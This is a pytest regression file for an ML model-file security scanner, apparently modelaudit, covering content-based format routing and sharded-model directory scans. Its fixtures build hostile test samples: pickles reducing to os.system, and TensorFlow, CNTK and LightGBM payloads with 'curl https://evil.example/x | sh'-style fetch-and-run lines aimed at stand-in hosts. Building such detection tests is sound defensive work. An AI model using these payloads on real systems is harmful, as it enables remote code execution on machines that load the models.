"""Core dispatch regressions for content-routed model formats."""

from __future__ import annotations

import base64
import gzip
import importlib
import json
import pickle
import struct
import sys
import zipfile
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit import core as core_module
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cache.optimized_config import normalize_material_scan_config
from modelaudit.core import scan_file, scan_model_directory_or_file
from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner, mxnet_scanner, safetensors_scanner
from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.jax_checkpoint_scanner import JaxCheckpointScanner
from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES
from modelaudit.utils.file import detection as file_detection
from modelaudit.utils.file.detection import (
    FLAX_MSGPACK_STRUCTURE_READ_BYTES,
    JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES,
    JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    ONNX_ROUTING_INCONCLUSIVE_FORMAT,
    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
    TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT,
)
from modelaudit.utils.helpers.secure_hasher import SecureFileHasher, compute_aggregate_hash
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
from tests.helpers import (
    create_mock_gguf,
    create_mock_mxnet_symbol,
    create_mock_onnx,
    create_mock_pytorch_zip,
    prefix_mock_onnx_with_unknown_field,
    prefix_mock_onnx_with_unknown_group,
)

_SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")


def test_multi_file_directory_scan_shares_one_pickle_source_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_dir = tmp_path / "modules"
    module_dir.mkdir()
    module_name = "modelaudit_tp_directory_call_graph_target"
    (module_dir / f"{module_name}.py").write_text(
        "import os\n\ndef invoke(command):\n    return os.system(command)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(module_dir))
    importlib.invalidate_caches()
    dangerous_module = importlib.import_module(module_name)
    dangerous_invoke = dangerous_module.invoke
    model_dir = tmp_path / "models"
    model_dir.mkdir()

    class Payload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (dangerous_invoke, ("echo cached-directory-scan",))

    for index in range(2):
        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))
    scopes_entered = 0
    scopes_exited = 0
    real_snapshot = core_module.shared_source_sensitive_caches

    @contextmanager
    def fake_snapshot() -> Iterator[None]:
        nonlocal scopes_entered, scopes_exited
        scopes_entered += 1
        with real_snapshot():
            try:
                yield
            finally:
                scopes_exited += 1

    monkeypatch.setattr(core_module, "shared_source_sensitive_caches", fake_snapshot)

    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)

    assert result.success is True
    assert result.files_scanned == 2
    assert (scopes_entered, scopes_exited) == (1, 1)
    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)


def test_multi_file_directory_scan_refreshes_changed_pickle_source_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_dir = tmp_path / "modules"
    module_dir.mkdir()
    module_name = "modelaudit_tp_directory_changed_call_graph_target"
    module_path = module_dir / f"{module_name}.py"
    module_path.write_text("def invoke(command):\n    return command\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(module_dir))
    importlib.invalidate_caches()
    safe_module = importlib.import_module(module_name)
    safe_invoke = safe_module.invoke
    model_dir = tmp_path / "models"
    model_dir.mkdir()

    class Payload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (safe_invoke, ("echo changed-directory-scan",))

    for index in range(2):
        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))

    source_rewritten = False

    def rewrite_before_second_scan(message: str, _percentage: float) -> None:
        nonlocal source_rewritten
        if "Scanning file 2/2" not in message or source_rewritten:
            return
        module_path.write_text(
            "import os\n\ndef invoke(command):\n    return os.system(command)\n",
            encoding="utf-8",
        )
        importlib.invalidate_caches()
        source_rewritten = True

    result = core_module.scan_model_directory_or_file(
        str(model_dir),
        cache_scan_results=False,
        progress_callback=rewrite_before_second_scan,
    )

    assert source_rewritten is True
    assert result.success is True
    assert result.files_scanned == 2
    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)


def _build_malicious_pickle() -> bytes:
    """Build a tiny pickle payload that exercises nested dangerous-opcode scanning."""
    import os as os_module

    class DangerousPayload:
        """Serializable payload that reduces to a shell command invocation."""

        def __reduce__(self) -> tuple[Any, tuple[str]]:
            """Return a dangerous reducer target for scanner regression coverage."""
            return (os_module.system, ("echo core-dispatch-test",))

    return pickle.dumps(DangerousPayload())


def _require_tf_protos() -> None:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")


def _build_malicious_tf_metagraph() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.meta_info_def.meta_graph_version = "modelaudit_route_test"
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_savedmodel() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _build_collection_only_tf_savedmodel(
    *,
    key: str = "runtime_hook",
    value: bytes = b"curl https://evil.example/x | sh",
) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    metagraph.collection_def[key].bytes_list.value.append(value)
    return cast(bytes, saved_model.SerializeToString())


def _build_collection_only_tf_metagraph(
    *,
    key: str = "runtime_hook",
    value: bytes = b"curl https://evil.example/x | sh",
) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.collection_def[key].bytes_list.value.append(value)
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_function_metagraph() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    function = metagraph.graph_def.library.function.add()
    function.signature.name = "danger"
    node = function.node_def.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_skops_schema() -> bytes:
    """Build a Skops schema that exercises CVE-2025-54412 detection."""
    return json.dumps(
        {
            "__loader__": "OperatorFuncNode",
            "__module__": "builtins",
            "__class__": "eval",
            "_skops_version": "0.11.0",
            "content": {},
        }
    ).encode("utf-8")


def _write_sparse_oversized_safetensors_candidate(
    path: Path,
    header_len: int = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1,
) -> None:
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(b"{")
        handle.truncate(8 + header_len + 1)


def _write_tensorflow_overlap_safetensors_candidate(path: Path, header_prefix: bytes) -> None:
    header_len = 0x212
    header = header_prefix + (b" " * (header_len - len(header_prefix)))
    path.write_bytes(struct.pack("<Q", header_len) + header + b"\x00")


def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
    """Write a ZIP archive at an intentionally misleading file path."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries.items():
            archive.writestr(name, data)


def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
    path.write_bytes(prefix + structure + payload)


def _write_delayed_flax_cntk_overlap(path: Path) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions "
    delayed_flax_root = flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "attacker_callable"},
        use_bin_type=True,
    )
    path.write_bytes(prefix + structure + (b"\xc0" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1)) + delayed_flax_root)


def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
    body = "tree=0\nversion=v4\nnum_class=1\n"
    if valid:
        body += (
            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
            "split_feature=0\nleaf_value=0.1 0.2\n"
            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
            "callback_url=https://collector.evil.example/payload.sh\n"
        )
    path.write_text(body, encoding="utf-8")


def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
    """Write a ZIP archive with duplicate entries in caller-defined order."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries:
            archive.writestr(name, data)


def _prepend_stub(path: Path, stub: bytes) -> None:
    """Prefix an existing ZIP with reader-tolerated self-extracting stub bytes."""
    path.write_bytes(stub + path.read_bytes())


def _mark_zip_entries_encrypted(path: Path) -> None:
    """Set the ZIP encryption flag on all entries without changing payload bytes."""
    archive_bytes = bytearray(path.read_bytes())
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        offset = 0
        while True:
            offset = archive_bytes.find(signature, offset)
            if offset < 0:
                break
            flags = int.from_bytes(archive_bytes[offset + flag_offset : offset + flag_offset + 2], "little")
            archive_bytes[offset + flag_offset : offset + flag_offset + 2] = (flags | 0x1).to_bytes(2, "little")
            offset += len(signature)
    path.write_bytes(archive_bytes)


def _assert_system_pickle_detected(result: ScanResult, entry_name: str) -> None:
    """Assert a nested pickle finding points at the expected ZIP entry."""
    assert any(
        issue.rule_code == "S201"
        and issue.details.get("zip_entry") == entry_name
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected S201 finding for {entry_name}, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def _mock_sharded_scan_result(bytes_scanned: int, *, missing_shards: int = 0) -> ScanResult:
    """Return a ScanResult shaped like the advanced sharded-model handler."""
    result = ScanResult(scanner_name="safetensors")
    result.bytes_scanned = bytes_scanned
    result.add_check(
        name="Mock Shard Scan",
        passed=True,
        message="Mock shard family scanned",
        severity=IssueSeverity.INFO,
    )
    if missing_shards:
        result.add_check(
            name="Sharded Model Coverage Check",
            passed=False,
            message=f"Missing {missing_shards} expected model shard(s); scan coverage is incomplete.",
            severity=IssueSeverity.INFO,
            details={
                "expected_total_shards": 3,
                "present_total_shards": 2,
                "missing_shard_count": missing_shards,
                "analysis_incomplete": True,
                "scan_outcome": "inconclusive",
                "scan_outcome_reason": "missing_model_shards",
            },
        )
        result.metadata["analysis_incomplete"] = True
        result.metadata["scan_outcome"] = "inconclusive"
        result.metadata["scan_outcome_reasons"] = ["missing_model_shards"]
    result.finish(success=missing_shards == 0)
    return result


def test_directory_scan_scans_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 4):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert set(result.file_metadata) == {str(shard) for shard in shards}
    assert {asset.path for asset in result.assets} == {str(shard) for shard in shards}


def test_directory_scan_preserves_per_shard_sizes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index, payload in enumerate((b"a", b"second-shard", b"third-shard-is-longer"), start=1):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(payload)
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        result = _mock_sharded_scan_result(family_size)
        result.metadata["file_size"] = family_size
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    expected_sizes = {str(shard): shard.stat().st_size for shard in shards}
    assert {path: metadata.file_size for path, metadata in result.file_metadata.items()} == expected_sizes
    assert {asset.path: asset.size for asset in result.assets} == expected_sizes


def test_directory_scan_rejects_shard_siblings_outside_scan_root(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    first_shard = model_dir / "model-00001-of-00002.safetensors"
    first_shard.write_bytes(b"inside-shard")
    outside_shard = outside_dir / "model-00002-of-00002.safetensors"
    outside_shard.write_bytes(b"outside-shard")
    (model_dir / outside_shard.name).symlink_to(outside_shard)
    calls: list[str] = []
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(first_shard.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
    outside_path = str(outside_shard.resolve())

    assert len(calls) == 1
    assert outside_path not in result.file_metadata
    assert outside_path not in {asset.path for asset in result.assets}
    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert outside_path not in {member["path"] for member in fingerprint["members"]}
    assert any(
        issue.message == "Path traversal outside scanned directory"
        and issue.location == outside_path
        and issue.details["resolved_path"] == outside_path
        for issue in result.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_groups_hf_cache_sharded_symlinks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshots_dir = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshots_dir.mkdir(parents=True)
    blobs_dir.mkdir()

    blob_paths: list[Path] = []
    shard_links: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        shard_link = snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_link.symlink_to(Path("../../blobs") / blob_path.name)
        blob_paths.append(blob_path.resolve())
        shard_links.append(shard_link)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshots_dir), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard_link.name for shard_link in shard_links}
    assert result.files_scanned == len(shard_links)
    assert set(result.file_metadata) == {str(shard_link) for shard_link in shard_links}
    assert {asset.path for asset in result.assets} == {str(shard_link) for shard_link in shard_links}
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}
    assert not any("path traversal" in issue.message.lower() for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_nonsharded_hf_snapshot_aliases_deduplicated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_path = blobs_dir / "shared-blob"
    blob_path.write_bytes(b"shared-model")

    for revision in ("abc123", "def456"):
        snapshots_dir = cache_dir / "snapshots" / revision
        snapshots_dir.mkdir(parents=True)
        (snapshots_dir / "model.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(blob_path.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert calls == [str(blob_path.resolve())]
    assert result.files_scanned == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_identical_hf_shard_families_across_snapshots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision in ("abc123", "def456"):
            snapshots_dir = cache_dir / "snapshots" / revision
            snapshots_dir.mkdir(parents=True, exist_ok=True)
            (snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
                Path("../../blobs") / blob_path.name
            )

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert result.files_scanned == len(blob_paths)
    assert result.bytes_scanned == sum(blob_path.stat().st_size for blob_path in blob_paths)
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_reports_incomplete_hf_snapshot_after_shared_blob_dedupe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        full_snapshot = cache_dir / "snapshots" / "abc123"
        full_snapshot.mkdir(parents=True, exist_ok=True)
        (full_snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
            Path("../../blobs") / blob_path.name
        )

    partial_snapshot = cache_dir / "snapshots" / "def456"
    partial_snapshot.mkdir(parents=True)
    (partial_snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_paths[0].name)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        material_config = normalize_material_scan_config(captured_configs[-1])
        fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
        member_paths = [Path(member["path"]) for member in fingerprint["members"]]
        return _mock_sharded_scan_result(
            sum(member_path.stat().st_size for member_path in member_paths),
            missing_shards=1 if len(member_paths) == 1 else 0,
        )

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_configs = [normalize_material_scan_config(config) for config in captured_configs]
    fingerprints = [config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY] for config in material_configs]
    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 2
    assert sorted(len(fingerprint["members"]) for fingerprint in fingerprints) == [1, 2]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_distinct_hf_shard_filename_patterns(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision, filename in (
            ("abc123", f"model-{shard_index:05d}-of-00002.safetensors"),
            ("def456", f"pytorch_model-{shard_index:05d}-of-00002.bin"),
        ):
            snapshot = cache_dir / "snapshots" / revision
            snapshot.mkdir(parents=True, exist_ok=True)
            (snapshot / filename).symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert len(calls) == 2
    assert {Path(call).suffix for call in calls} == {".bin", ".safetensors"}
    assert result.files_scanned == 4


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_hf_shard_aliases_against_raw_blobs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}.safetensors"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        (snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).parent == snapshot
    assert result.files_scanned == 2


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_handles_broken_hf_shard_alias_per_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob-1"
    blob_path.write_bytes(b"hf-shard-1")
    (snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)
    missing_blob = blobs_dir / "missing-blob"
    (snapshot / "model-00002-of-00002.safetensors").symlink_to(Path("../../blobs") / missing_blob.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        if Path(path) == missing_blob:
            result = ScanResult(scanner_name="error")
            result.add_check(
                name="File Size Check",
                passed=False,
                message="Error checking file size: missing blob",
                severity=IssueSeverity.INFO,
            )
            result.finish(success=False)
            return result
        return _mock_sharded_scan_result(blob_path.stat().st_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 2
    assert str(missing_blob) in calls
    assert len(coverage_checks) == 1
    assert any(check.name == "File Size Check" for check in result.checks)


def test_scan_file_passes_shard_allowlist_to_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_allowed_paths: list[list[str] | None] = []

    class DummyScanner:
        name = "dummy"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

    def fake_select_preferred_scanner_id(path: str, header_format: str, ext: str) -> str | None:
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return None

    def fake_get_scanner_for_path(path: str, **kwargs: Any) -> type[DummyScanner]:
        assert path == str(shard)
        assert kwargs == {"scanner_selection": None}
        return DummyScanner

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "should_use_advanced_handler", lambda path: path == str(shard))
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", fake_get_scanner_for_path)
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {"path": allowed_path, "content_hash": "sha256:inside"},
                    {"path": 123, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy"
    assert captured_allowed_paths == [[allowed_path]]


def test_scan_file_passes_shard_allowlist_to_preferred_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_allowed_paths: list[list[str] | None] = []

    class DummyPreferredScanner:
        name = "dummy_preferred"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

        @staticmethod
        def can_handle(path: str) -> bool:
            return path == str(shard)

    def fake_select_preferred_scanner_id(path: str, header_format: str, ext: str) -> str | None:
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return "dummy_preferred"

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyPreferredScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert scanner.name == "dummy_preferred"
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "should_use_advanced_handler", lambda path: path == str(shard))
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
